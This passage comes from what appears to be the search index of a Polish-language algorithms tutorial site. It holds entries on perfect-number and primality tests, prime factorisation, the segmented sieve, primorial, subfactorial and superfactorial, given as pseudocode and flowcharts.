<p>Liczba doskona\u0142a</p> <p>Liczba doskona\u0142a to taka, kt\u00f3ra jest r\u00f3wna sumie wszystkich swoich dzielnik\u00f3w w\u0142a\u015bciwych.</p> <p>Info</p> <p>Dzielnik w\u0142a\u015bciwy</p> <p>Dzielnik liczby r\u00f3\u017cny od niej samej.</p> <p>Podobnie jak w przypadku testu pierwszo\u015bci, problem doskona\u0142o\u015bci liczby jest podobny do problemu znalezienia wszystkich dzielnik\u00f3w liczby, opisanego tutaj: Wszystkie dzielniki</p> <p>Zaczynamy od formalnej specyfikacji i przyk\u0142adu.</p>"},{"location":"algorithms/integers/perfect-test/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/perfect-test/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"algorithms/integers/perfect-test/#wynik","title":"Wynik","text":"<ul> <li>PRAWDA - je\u017celi \\(n\\) jest liczb\u0105 doskona\u0142\u0105</li> <li>FA\u0141SZ - je\u017celi \\(n\\) nie jest liczb\u0105 doskona\u0142\u0105</li> </ul>"},{"location":"algorithms/integers/perfect-test/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/integers/perfect-test/#dane_1","title":"Dane","text":"<pre><code>n := 6\n</code></pre> <p>Wynik: PRAWDA</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Dzielnikami w\u0142a\u015bciwymi liczby \\(6\\) s\u0105: \\(1, 2, 3\\) </p> <p>Po ich zsumowaniu otrzymamy z powrotem liczb\u0119 \\(6\\):</p> <p>\\(6=1+2+3\\) </p>"},{"location":"algorithms/integers/perfect-test/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/integers/perfect-test/#dane_2","title":"Dane","text":"<pre><code>n := 8\n</code></pre> <p>Wynik: FA\u0141SZ</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Dzielnikami w\u0142a\u015bciwymi liczby 8 s\u0105: \\(1, 2,4\\) </p> <p>Po ich zsumowaniu otrzymamy liczb\u0119 \\(7\\):</p> <p>\\(8\\not=1+2+4\\) </p>"},{"location":"algorithms/integers/perfect-test/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>Tym razem pominiemy rozwi\u0105zanie zupe\u0142nie naiwne i zaczniemy od naiwnego. B\u0119dziemy wi\u0119c przechodzi\u0107 przez kolejne warto\u015bci od \\(1\\) do po\u0142owy naszej liczby. Tym razem nie chcemy ich wypisywa\u0107, tylko zsumowa\u0107. Potrzebna wi\u0119c nam b\u0119dzie dodatkowa zmienna, do kt\u00f3rej b\u0119dziemy dodawa\u0107 kolejne dzielniki. Oczywi\u015bcie tak\u0105 zmienn\u0105 musimy utworzy\u0107 przed p\u0119tl\u0105. Jak\u0105 warto\u015b\u0107 pocz\u0105tkow\u0105 nale\u017cy jej nada\u0107? Jak to zwykle bywa, sumowanie zaczynamy od zera.</p> <p>W p\u0119tli, gdy znajdziemy kolejny dzielnik, to dodajemy go do sumy. Na ko\u0144cu, gdy ju\u017c zsumujemy wszystkie dzielniki, czyli po wyj\u015bciu z p\u0119tli, nale\u017cy sprawdzi\u0107, jaki wynik powinni\u015bmy zwr\u00f3ci\u0107. W tym celu por\u00f3wnujemy obliczon\u0105 sum\u0119 ze sprawdzan\u0105 liczb\u0105. Je\u017celi s\u0105 sobie r\u00f3wne, to znaczy, \u017ce mamy do czynienia z liczb\u0105 doskona\u0142\u0105, wi\u0119c zwracamy wynik PRAWDA. Je\u017celi s\u0105 od siebie r\u00f3\u017cne, to liczba nie jest doskona\u0142a, wi\u0119c zwracamy FA\u0141SZ.</p> <p>Teraz mo\u017cemy zapisa\u0107 nasz algorytm.</p>"},{"location":"algorithms/integers/perfect-test/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja CzyDoskonala(n):\n    1. suma := 0\n    2. Od i := 1 do n div 2, wykonuj:\n        3. Je\u017celi (n mod i) = 0, to:\n            4. suma := suma + i\n\n    5. Je\u017celi suma = n, to:\n        6. Zwr\u00f3\u0107 PRAWDA, zako\u0144cz\n\n    7. w przeciwnym przypadku:\n        8. Zwr\u00f3\u0107 FA\u0141SZ, zako\u0144cz\n</code></pre>"},{"location":"algorithms/integers/perfect-test/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"CzyDoskonala(n)\"]) --&gt; K1[\"suma := 0\n    i := 1\"]\n    K1 --&gt; K2{i &lt;= n div 2}\n    K2 -- PRAWDA --&gt; K3{\"(n mod i) = 0\"}\n    K3 -- PRAWDA --&gt; K4[suma := suma + i]\n    K3 -- FA\u0141SZ --&gt; K2i[i := i + 1]\n    K4 --&gt; K2i\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K5{suma = n}\n    K5 -- PRAWDA --&gt; K6[/Zwr\u00f3\u0107 PRAWDA/]\n    K6 --&gt; STOP([STOP])\n    K5 -- FA\u0141SZ --&gt; K8[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K8 --&gt; STOP</code></pre>"},{"location":"algorithms/integers/perfect-test/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\frac{n}{2})\\)</p>"},{"location":"algorithms/integers/perfect-test/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>Podobnie jak w przypadku testu pierwszo\u015bci, r\u00f3wnie\u017c i tutaj mo\u017cemy sprawdzi\u0107 dzielniki przechodz\u0105c wy\u0142\u0105cznie do pierwiastka z zadanej liczby w\u0142\u0105cznie. Nie wystarczy jednak, \u017ce zsumujemy dzielniki do pierwiastka, musimy tak\u017ce uwzgl\u0119dni\u0107 te z pary. Dla przyk\u0142adu, je\u017celi wiemy \u017ce 6 dzieli si\u0119 przez 2, to oznacza tak\u017ce, \u017ce dzieli si\u0119 przez 3, poniewa\u017c \\(6/2=3\\). Musimy jeszcze uwa\u017ca\u0107, by dwukrotnie nie doda\u0107 tego samego dzielnika (np. \\(4/2=2\\)).</p>"},{"location":"algorithms/integers/perfect-test/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja CzyDoskonala(n)\n    1. suma := 1\n    2. Od i := 2 do sqrt(n), wykonuj:\n        3. Je\u017celi (n mod i) = 0, to:\n            4. suma := suma + i\n            5. Je\u017celi (n / i) != i, to:\n                6. suma := suma + (n / i)\n\n    7. Je\u017celi suma = n, to:\n        8. Zwr\u00f3\u0107 PRAWDA\n\n    9. w przeciwnym przypadku:\n        10. Zwr\u00f3\u0107 FA\u0141SZ\n</code></pre> <p>Info</p> <p>sqrt oznacza pierwiastek drugiego stopnia</p>"},{"location":"algorithms/integers/perfect-test/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"CzyDoskonala(n)\"]) --&gt; K1[\"suma := 1\n    i := 2\"]\n    K1 --&gt; K2{\"i &lt;= sqrt(n)\"}\n    K2 -- PRAWDA --&gt; K3{\"(n mod i) = 0\"}\n    K3 -- PRAWDA --&gt; K4[suma := suma + i]\n    K4 --&gt; K5{\"(n / i) != i\"}\n    K5 -- PRAWDA --&gt; K6[\"suma := suma + (n / i)\"]\n    K6 --&gt; K2i[i := i + 1]\n    K5 -- FA\u0141SZ --&gt; K2i\n    K3 -- FA\u0141SZ --&gt; K2i\n    K2i --&gt; K2\n    K2 -- FA\u0141SZ --&gt; K7{suma = n}\n    K7 -- PRAWDA ---&gt; K8[/Zwr\u00f3\u0107 PRAWDA/]\n    K8 ---&gt; STOP([STOP])\n    K7 -- FA\u0141SZ ---&gt; K10[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K10 ---&gt; STOP</code></pre>"},{"location":"algorithms/integers/perfect-test/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\sqrt{n})\\) </p>"},{"location":"algorithms/integers/perfect-test/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/perfect-test/#c","title":"C++","text":""},{"location":"algorithms/integers/perfect-test/#python","title":"Python","text":""},{"location":"algorithms/integers/perfect-test/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/integers/perfect-test/#haskell","title":"Haskell","text":""},{"location":"algorithms/integers/perfect-test/#powiazane-zagadnienia","title":"Powi\u0105zane zagadnienia","text":"<ul> <li>Znajdowanie wszystkich liczb doskona\u0142ych mniejszych od zadanej warto\u015bci \\(n\\).</li> <li>Sprawdzanie, czy w podanym zakresie znajduje si\u0119 liczba doskona\u0142a.</li> <li>Sprawdzanie, czy suma cyfr liczby doskona\u0142ej te\u017c jest liczb\u0105 doskona\u0142\u0105.</li> </ul>"},{"location":"algorithms/integers/prime-factors/","title":"Rozk\u0142ad na czynniki pierwsze","text":"<p>Ka\u017cd\u0105 liczb\u0119 naturaln\u0105 wi\u0119ksz\u0105 od \\(1\\) mo\u017cemy roz\u0142o\u017cy\u0107 na czynniki pierwsze, czyli przedstawi\u0107 w postaci iloczynu liczb pierwszych. Tym problemem si\u0119 w\u0142a\u015bnie zajmiemy.</p>"},{"location":"algorithms/integers/prime-factors/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/prime-factors/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna, \\(n&gt;1\\).</li> </ul>"},{"location":"algorithms/integers/prime-factors/#wynik","title":"Wynik","text":"<ul> <li>Rozk\u0142ad liczby \\(n\\) na czynniki pierwsze .</li> </ul>"},{"location":"algorithms/integers/prime-factors/#przykad","title":"Przyk\u0142ad","text":""},{"location":"algorithms/integers/prime-factors/#dane_1","title":"Dane","text":"<pre><code>n := 124\n</code></pre> <p>Wynik: \\(2, 2, 31\\) </p>"},{"location":"algorithms/integers/prime-factors/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<p>Idea rozwi\u0105zania jest prosta. Zaczynamy od najmniejszej liczby pierwszej, czyli od liczby \\(2\\). Dzielimy nasz\u0105 liczb\u0119 \\(n\\) przez nasz\u0105 liczb\u0119 pierwsz\u0105, tak d\u0142ugo, jak si\u0119 da, czyli jak d\u0142ugo jest podzielna. Nast\u0119pnie przechodzimy do kolejnej liczby pierwszej i powtarzamy operacje dzielenia. Ca\u0142o\u015b\u0107 powtarzamy, a\u017c wynikiem dzielenia b\u0119dzie warto\u015b\u0107 \\(1\\).</p>"},{"location":"algorithms/integers/prime-factors/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja Rozk\u0142ad(n):\n    1. i := 2\n    2. Dop\u00f3ki n &gt; 1, wykonuj:\n        3. Je\u017celi n mod i = 0, to:\n            4. Wypisz i\n            5. n := n div i\n        6. W przeciwnym przypadku:\n            7. i := i + 1\n</code></pre> <p>Info</p> <p>mod oznacza reszt\u0119 z dzielenia</p> <p>div oznacza dzielenie ca\u0142kowite</p>"},{"location":"algorithms/integers/prime-factors/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"Rozk\u0142ad(n)\"]) --&gt; K1[i := 2]\n    K1 --&gt; K2{n &gt; 1}\n    K2 -- PRAWDA --&gt; K3{n mod i = 0}\n    K3 -- PRAWDA --&gt; K4[/Wypisz i/]\n    K4 --&gt; K5[n := n div i]\n    K5 --&gt; K2\n    K3 -- FA\u0141SZ --&gt; K7[i := i + 1]\n    K7 --&gt; K2\n    K2 -- FA\u0141SZ ----&gt; STOP([STOP])</code></pre>"},{"location":"algorithms/integers/prime-factors/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/prime-factors/#c","title":"C++","text":""},{"location":"algorithms/integers/prime-factors/#python","title":"Python","text":""},{"location":"algorithms/integers/prime-factors/#implementacja-pozostae","title":"Implementacja - pozosta\u0142e","text":""},{"location":"algorithms/integers/prime-factors/#haskell","title":"Haskell","text":""},{"location":"algorithms/integers/prime-factors/#powiazane-zagadnienia","title":"Powi\u0105zane zagadnienia","text":"<ul> <li>Znajdowanie wszystkich unikalnych czynnik\u00f3w pierwszych zadanej liczby naturalnej.</li> <li>Obliczanie najwi\u0119kszego wsp\u00f3lnego dzielnika (NWD) dw\u00f3ch liczb naturalnych.</li> <li>Obliczanie najmniejszej wsp\u00f3lnej wielokrotno\u015bci (NWW) dw\u00f3ch liczb naturalnych.</li> </ul>"},{"location":"algorithms/integers/prime-test/","title":"Test pierwszo\u015bci","text":"<p>Liczby pierwsze odgrywaj\u0105 w matematyce i informatyce znacz\u0105c\u0105 rol\u0119, szczeg\u00f3lnie w kryptografii. Zacznijmy od zdefiniowania czym jest liczba pierwsza:</p> <p>Info</p> <p>Liczba pierwsza</p> <p>Liczb\u0119 naturaln\u0105, kt\u00f3ra jest podzielna wy\u0142\u0105cznie przez \\(1\\) i przez siebie sam\u0105, nazywamy liczb\u0105 pierwsz\u0105.</p> <p>Naszym zadaniem jest sprawdzi\u0107, czy dana liczba naturalna jest liczb\u0105 pierwsz\u0105. Jednym ze sposob\u00f3w jest sprawdzi\u0107, jakie dzielniki ma ta liczba. Nasze podej\u015bcie do tego problemu b\u0119dzie bardzo podobne jak w przypadku wypisania wszystkich dzielnik\u00f3w liczby, dlatego warto najpierw zajrze\u0107 do tego w\u0142a\u015bnie tematu: Wszystkie dzielniki</p> <p>Jak zwykle zaczynamy od formalnej specyfikacji problemu i kilku prostych przyk\u0142ad\u00f3w.</p>"},{"location":"algorithms/integers/prime-test/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/prime-test/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna wi\u0119ksza od \\(1\\) </li> </ul>"},{"location":"algorithms/integers/prime-test/#wynik","title":"Wynik","text":"<ul> <li>PRAWDA- je\u017celi \\(n\\) jest liczb\u0105 pierwsz\u0105</li> <li>FA\u0141SZ- je\u017celi \\(n\\) nie jest liczb\u0105 pierwsz\u0105</li> </ul> <p>Info</p> <p>Dlaczego w specyfikacji wymagamy, \u017ceby liczba \\(n\\) by\u0142a wi\u0119ksza od \\(1\\)? Dla u\u0142atwienia i zwi\u0119kszenia czytelno\u015bci rozwi\u0105zania. Wiadomo, \u017ce liczby \\(0\\) i \\(1\\) nie s\u0105 liczbami pierwszymi. W zwi\u0105zku z tym mo\u017cemy je \u0142atwo potraktowa\u0107 jako osobny przypadek, u\u017cywaj\u0105c instrukcji warunkowej. To jednak zostawimy jako \u0107wiczenie do samodzielnego wykonania.</p>"},{"location":"algorithms/integers/prime-test/#przykad-1","title":"Przyk\u0142ad 1","text":""},{"location":"algorithms/integers/prime-test/#dane_1","title":"Dane","text":"<pre><code>n := 7\n</code></pre> <p>Wynik: PRAWDA</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Dzielnikami liczby \\(7\\) s\u0105 \\(1\\) i \\(7\\), wi\u0119c jest to liczba pierwsza.</p>"},{"location":"algorithms/integers/prime-test/#przykad-2","title":"Przyk\u0142ad 2","text":""},{"location":"algorithms/integers/prime-test/#dane_2","title":"Dane","text":"<pre><code>n := 8\n</code></pre> <p>Wynik: FA\u0141SZ</p> <p>Info</p> <p>Wyja\u015bnienie</p> <p>Dzielnikami liczby 8 s\u0105 \\(1,2,4\\) i \\(8\\), wi\u0119c nie jest to liczba pierwsza.</p>"},{"location":"algorithms/integers/prime-test/#rozwiazanie-zupenie-naiwne","title":"Rozwi\u0105zanie zupe\u0142nie naiwne","text":"<p>W pierwszym rozwi\u0105zaniu post\u0119powa\u0107 b\u0119dziemy podobnie, jak w przypadku wypisywania wszystkich dzielnik\u00f3w liczby. S\u0105 jednak dwie znacz\u0105ce r\u00f3\u017cnice. Po pierwsze nie interesuje nas, czy liczba jest podzielna przez \\(1\\) i sam\u0105 siebie, poniewa\u017c z g\u00f3ry wiemy, \u017ce tak jest. Mo\u017cemy wi\u0119c nieznacznie zaw\u0119zi\u0107 obszar poszukiwa\u0144. Po drugie nie interesuje nas jakie dok\u0142adnie dzielniki ma liczba, tylko czy ma jakie\u015b dzielniki, r\u00f3\u017cne od \\(1\\) i niej samej. W zwi\u0105zku z tym, jak tylko znajdziemy jaki\u015b dzielnik, mo\u017cemy od razu stwierdzi\u0107, \u017ce liczba nie jest pierwsza i zwr\u00f3ci\u0107 w\u0142a\u015bciw\u0105 warto\u015b\u0107, czyli FA\u0141SZ i zako\u0144czy\u0107 obliczenia.</p> <p>Jak jednak sprawdzi\u0107, \u017ce liczba jest pierwsza? To proste. Wystarczy, \u017ce nie znajdziemy \u017cadnych dzielnik\u00f3w. Jak nie znajdziemy dzielnik\u00f3w, to nie zwr\u00f3cimy warto\u015bci FA\u0141SZ, tylko wyjdziemy z p\u0119tli. Je\u015bli tak si\u0119 stanie, to znaczy, \u017ce liczba jest pierwsza, nale\u017cy wi\u0119c zwr\u00f3ci\u0107 warto\u015b\u0107 PRAWDA.</p> <p>Podsumujmy nasze rozwa\u017cania w formie gotowego algorytmu.</p>"},{"location":"algorithms/integers/prime-test/#pseudokod","title":"Pseudokod","text":"<pre><code>funkcja CzyPierwsza(n):\n    1. Od i := 2 do n - 1, wykonuj:\n        2. Je\u017celi (n mod i) = 0, to:\n            3. Zwr\u00f3\u0107 FA\u0141SZ\n\n    4. Zwr\u00f3\u0107 PRAWDA\n</code></pre> <p>Info</p> <p>mod oznacza operacj\u0119 reszty z dzielenia</p>"},{"location":"algorithms/integers/prime-test/#schemat-blokowy","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"CzyPierwsza(n)\"]) --&gt; K0[i := 2]\n    K0 --&gt; K1{i &lt; n}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K3 --&gt; STOP([STOP])\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; K4[/Zwr\u00f3\u0107 PRAWDA/]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/integers/prime-test/#wizualizacja-dla-n-10","title":"Wizualizacja dla n = 10","text":"<p> Wizualizacja testu pierwszo\u015bci</p>"},{"location":"algorithms/integers/prime-test/#zozonosc","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(n)\\) - liniowa</p>"},{"location":"algorithms/integers/prime-test/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<p>Mamy ju\u017c pierwsze rozwi\u0105zanie naszego problemu. Zastan\u00f3wmy si\u0119 teraz, jak mo\u017cemy je zoptymalizowa\u0107, czyli usprawni\u0107. Szczeg\u00f3lnym fragmentem naszego rozwi\u0105zania, kt\u00f3ry a\u017c prosi si\u0119 o optymalizacj\u0119, jest przegl\u0105danie liczb od \\(2\\) do \\(n-1\\). Pomy\u015blmy, jak mo\u017cemy zaw\u0119zi\u0107 ten zakres?</p> <p>Zauwa\u017cmy, \u017ce od pewnej warto\u015bci mo\u017cemy mie\u0107 ju\u017c gwarancj\u0119, \u017ce nie znajdziemy kolejnych dzielnik\u00f3w. Gdy sprawdzana liczba jest wi\u0119ksza od po\u0142owy \\(n\\), to nie mo\u017ce by\u0107 ju\u017c dzielnikiem \\(n\\). W zwi\u0105zku z tym wystarczy, \u017ce b\u0119dziemy sprawdza\u0107 potencjalne dzielniki do \\(n/2\\), a dok\u0142adniej do cz\u0119\u015bci ca\u0142kowitej z tego\u017c dzielenia.</p>"},{"location":"algorithms/integers/prime-test/#pseudokod_1","title":"Pseudokod","text":"<pre><code>funkcja CzyPierwsza(n):\n    1. Od i := 2 do n div 2, wykonuj:\n        2. Je\u017celi (n mod i) = 0, to:\n            3. Zwr\u00f3\u0107 FA\u0141SZ\n\n    4. Zwr\u00f3\u0107 PRAWDA\n</code></pre>"},{"location":"algorithms/integers/prime-test/#schemat-blokowy_1","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"CzyPierwsza(n)\"]) --&gt; K0[i := 2]\n    K0 --&gt; K1{i &lt;= n div 2}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K3 --&gt; STOP([STOP])\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; K4[/Zwr\u00f3\u0107 PRAWDA/]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/integers/prime-test/#zozonosc_1","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\frac{n}{2})\\) </p>"},{"location":"algorithms/integers/prime-test/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<p>Mo\u017cemy jeszcze bardziej skr\u00f3ci\u0107 zakres przeszukiwanych warto\u015bci. Mo\u017cna matematycznie udowodni\u0107, \u017ce je\u017celi liczba naturalna jest liczb\u0105 z\u0142o\u017con\u0105, to posiada przynajmniej jeden dzielnik (poza jedynk\u0105) mniejszy b\u0105d\u017a r\u00f3wny pierwiastkowi z siebie samej.</p> <p>Dlatego mo\u017cemy nasz\u0105 p\u0119tl\u0119 ograniczy\u0107 do pierwiastka z \\(n\\) w\u0142\u0105cznie.</p>"},{"location":"algorithms/integers/prime-test/#pseudokod_2","title":"Pseudokod","text":"<pre><code>funkcja CzyPierwsza(n):\n    1. Od i := 2 do sqrt(n), wykonuj:\n        2. Je\u017celi (n mod i) = 0, to:\n            3. Zwr\u00f3\u0107 FA\u0141SZ\n\n    4. Zwr\u00f3\u0107 PRAWDA\n</code></pre> <p>Info</p> <p>sqrt oznacza pierwiastek</p>"},{"location":"algorithms/integers/prime-test/#schemat-blokowy_2","title":"Schemat blokowy","text":"<pre><code>%%{init: {\"flowchart\": {\"curve\": \"linear\"}, \"theme\": \"neutral\"} }%%\nflowchart TD\n    START([\"CzyPierwsza(n)\"]) --&gt; K0[i := 2]\n    K0 --&gt; K1{\"i &lt;= sqrt(n)\"}\n    K1 -- PRAWDA --&gt; K2{n mod i = 0}\n    K2 -- PRAWDA --&gt; K3[/Zwr\u00f3\u0107 FA\u0141SZ/]\n    K3 --&gt; STOP([STOP])\n    K2 -- FA\u0141SZ --&gt; K1i[i := i + 1]\n    K1i --&gt; K1\n    K1 -- FA\u0141SZ ----&gt; K4[/Zwr\u00f3\u0107 PRAWDA/]\n    K4 --&gt; STOP</code></pre>"},{"location":"algorithms/integers/prime-test/#zozonosc_2","title":"Z\u0142o\u017cono\u015b\u0107","text":"<p>\\(O(\\sqrt{n})\\) </p>"},{"location":"algorithms/integers/prime-test/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/prime-test/#c","title":"C++","text":""},{"location":"algorithms/integers/prime-test/#python","title":"Python","text":""},{"location":"algorithms/integers/prime-test/#implementacje-pozostae","title":"Implementacje \u2014 pozosta\u0142e","text":""},{"location":"algorithms/integers/prime-test/#haskell","title":"Haskell","text":""},{"location":"algorithms/integers/primorial/","title":"Primorial","text":"<p>Primorial (symbolizowany przez \\(n\\#\\)) jest to produkt pierwszych \\(n\\) liczb pierwszych. Na przyk\u0142ad, \\(5\\#\\) to wynik mno\u017cenia pierwszych pi\u0119ciu liczb pierwszych: \\(2 * 3 * 5 * 7 * 11 = 2310\\).</p> <p>W spos\u00f3b bardziej formalny, primorial liczby \\(n\\), oznaczany jako \\(n\\#\\), jest zdefiniowany jako iloczyn pierwszych \\(n\\) liczb pierwszych. </p> <p>Innymi s\u0142owy, je\u017celi \\(p_i\\) oznacza \\(i\\)-t\u0105 liczb\u0119 pierwsz\u0105 (tak, \u017ce \\(p_1 = 2\\), \\(p_2 = 3\\), \\(p_3 = 5\\), itd.), to:</p> <p>\\(n\\# = p_1 * p_2 * ... * p_n\\).</p> <p>W szczeg\u00f3lno\u015bci, dla \\(n = 0\\), definujemy \\(0\\# = 1\\), zgodnie z konwencj\u0105, \u017ce iloczyn zbioru pustego to \\(1\\).</p> <p>Primorial nie powinien by\u0107 mylony z funkcj\u0105 silni, \\(n!\\), kt\u00f3ra jest iloczynem wszystkich liczb naturalnych do \\(n\\). Obie funkcje rosn\u0105 bardzo szybko, ale silnia ro\u015bnie znacznie szybciej.</p>"},{"location":"algorithms/integers/primorial/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/primorial/#python","title":"Python","text":""},{"location":"algorithms/integers/segment-sieve/","title":"Sito segmentowe","text":"<p>Czasami jest tak, \u017ce potrzebujemy wygenerowa\u0107 liczby pierwsze z zadanego zakresu. Powiedzmy, \u017ce np. potrzebujemy zna\u0107 wszystkie liczby pierwsze od miliona do dw\u00f3ch milion\u00f3w. Oczywi\u015bcie mogliby\u015bmy skorzysta\u0107 ze standardowego Sita Eratostenesa. Jednak nie jest to najbardziej wydajne rozwi\u0105zanie. Dlaczego? Korzystaj\u0105c ze standardowego sita wygenerujemy wszystkie liczby z zakresu od jeden do dw\u00f3ch milion\u00f3w. Oznacza to, \u017ce dostaniemy wiele nadmiarowych liczb pierwszych! Tutaj przychodzi z pomoc\u0105 sito segmentowe.</p> <p>Idea sita segmentowego jest prosta. Najpierw generujemy odpowiedni zakres liczb pierwszych za pomoc\u0105 standardowego sita, a nast\u0119pnie u\u017cywamy ich do eliminacji liczb z\u0142o\u017conych na naszym segmencie.</p>"},{"location":"algorithms/integers/segment-sieve/#specyfikacja","title":"Specyfikacja","text":""},{"location":"algorithms/integers/segment-sieve/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna, pocz\u0105tek zakresu</li> <li>\\(b\\) - liczba naturalna, koniec zakresu</li> </ul>"},{"location":"algorithms/integers/segment-sieve/#wynik","title":"Wynik","text":"<ul> <li>Liczby pierwsze z zakresu \\(&lt;a, b&gt;\\)</li> </ul>"},{"location":"algorithms/integers/segment-sieve/#psuedokod","title":"Psuedokod","text":"<pre><code>Funkcja SitoSegmentowe(a, b):\n    1. pierwsze := SitoEratostenesa(sufit pierwiastka kwadratowego z b)\n    2. n := b - a + 1\n    3. czyPierwsza[0..n-1] := tablica wype\u0142niona warto\u015bciami true\n    4. Dla ka\u017cdej liczby p w tablicy pierwsze, wykonuj:\n        5. start := (a div p) * p\n        6. Je\u017celi start &lt; a, to:\n            7. start := start + p\n        8. Je\u017celi start == p, to:\n            9. start := start + p\n        10. Dla j od start do b, przechodz\u0105c co p, wykonuj:\n            11. czyPierwsza[j - a] := false\n    12. wynik := pusta tablica\n    13. Dla i od 0 do n - 1, wykonuj:\n        14. Je\u017celi czy_pierwsza[i], to:\n            15. Dopisz i + a do tablicy wynik\n    16. Zwr\u00f3c wynik\n</code></pre>"},{"location":"algorithms/integers/segment-sieve/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/segment-sieve/#c","title":"C++","text":""},{"location":"algorithms/integers/segment-sieve/#python","title":"Python","text":""},{"location":"algorithms/integers/subfactorial/","title":"Zaprzeczenie silni","text":"<p>Subfactorial (\\(!n\\), derangement lub zaprzeczenie silni) to operacja na liczbach naturalnych. Okre\u015bla liczb\u0119 permutacji zbioru \\(n\\)-elementowego, w kt\u00f3rych \u017caden element nie znajduje si\u0119 na swoim pocz\u0105tkowym miejscu. Takie permutacje nazywane s\u0105 permutacjami bez punkt\u00f3w sta\u0142ych lub permutacjami zupe\u0142nymi.</p> <p>Subfactorial dla danej liczby \\(n\\) mo\u017cna obliczy\u0107 za pomoc\u0105 poni\u017cszego wzoru:</p> <p>\\(!n = n! * (1 - 1/1! + 1/2! - 1/3! + ... + (-1)^n/n!)\\)</p> <p>gdzie \\(n!\\) oznacza silni\u0119 liczby \\(n\\).</p> <p>Alternatywnie, subfactorial mo\u017cna obliczy\u0107 rekurencyjnie za pomoc\u0105 poni\u017cszego wzoru:</p> \\[ !n =  \\begin{cases}        1 &amp; n = 0 \\\\       0 &amp; n = 1 \\\\       (n - 1) * (!(n - 1) + !(n - 2)) &amp; n &gt; 1\\\\    \\end{cases} \\]"},{"location":"algorithms/integers/subfactorial/#przykad","title":"Przyk\u0142ad","text":"<p>\\(!3 = 2\\), poniewa\u017c s\u0105 dwie permutacje zbioru \\(\\{1, 2, 3\\}\\), w kt\u00f3rych \u017caden element nie znajduje si\u0119 na swoim pocz\u0105tkowym miejscu: \\((2, 3, 1)\\) i \\((3, 1, 2)\\).</p>"},{"location":"algorithms/integers/subfactorial/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/subfactorial/#python","title":"Python","text":""},{"location":"algorithms/integers/superfactorial/","title":"Superfactorial","text":"<p>Superfactorial to funkcja zaproponowana przez Clifforda Pickovera. Dla liczby naturalnej \\(n\\), superfactorial \\(n\\), oznaczany jako \\(n\\$\\), jest zdefiniowany jako iloczyn pierwszych \\(n\\) silni. Innymi s\u0142owy, je\u017celi \\(n!\\) oznacza silni\u0119 z \\(n\\) (tak, \u017ce \\(n! = n * (n - 1) * ... * 2 * 1\\)), to</p> <p>\\(n\\$ = 1! * 2! * 3! * ... * n!\\)</p> <p>Zauwa\u017cmy, \u017ce superfactorial ro\u015bnie bardzo szybko. Na przyk\u0142ad, \\(4\\$=288\\), a \\(5\\$=34560\\).</p>"},{"location":"algorithms/integers/superfactorial/#implementacja","title":"Implementacja","text":""},{"location":"algorithms/integers/superfactorial/#python","title":"Python","text":""},{"location":"algorithms/integers/atm-problem/","title":"Problem bankomatu (wydawanie 